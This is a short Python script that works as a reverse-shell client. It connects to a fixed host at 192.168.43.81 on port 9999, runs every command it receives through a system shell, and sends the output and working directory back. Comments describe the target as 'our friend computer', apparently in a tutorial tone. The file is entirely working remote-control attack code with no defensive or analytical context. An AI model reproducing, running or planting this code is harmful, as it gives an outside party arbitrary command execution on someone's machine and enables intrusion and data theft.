import socket
import os
import subprocess

s = socket.socket()
host = '192.168.43.81'
port = 9999

s.connect((host, port))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':  # here we are checking if we want to change our directory or not
        os.chdir(data[3:].decode("utf-8"))  # This is a change directory command
    if len(data) > 0:
        # below we are using shell to execute commands like dir we are also tackling any errors in our command
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "  # here we are storing the current working directory in our friend computer
        s.send(str.encode(output_str + currentWD))

        print(output_str)
